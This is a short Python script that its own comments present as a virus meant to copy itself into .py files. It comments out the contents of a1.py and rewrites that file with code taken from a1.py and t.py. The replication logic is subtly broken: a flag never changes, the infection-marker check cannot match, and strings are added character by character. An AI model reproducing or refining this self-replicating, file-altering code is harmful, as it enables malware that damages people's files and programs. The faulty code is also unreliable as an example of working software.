#!/usr/bin/env python3
import sys
import glob
import os

# Commenting content of existing .py file
with open('a1.py') as fp:
    lines = fp.read().splitlines()
with open('a1.py', "w") as fp:
    for line in lines:
        print("#" + line, file=fp)

virusCode = []

with open('a1.py', 'r') as f:
	lines = f.readlines()

self_replicating_part = False
for line in lines:
	if not self_replicating_part:
		virusCode.append(line)

# Copying virus into arrary
with open('t.py', 'r') as p:
	fileCode = p.readlines()

infected = False

for line in fileCode:
	if line == "# THIS FILE IS INFECTED":
		infected = True
		break
	if not infected:
		finalCode = []
		finalCode.extend("# ")
		finalCode.extend(virusCode)
		finalCode.extend("\n")
		finalCode.extend(fileCode)
		
		# Replicating virus onto .py files
		with open('a1.py', 'w') as f:
			f.writelines(finalCode)
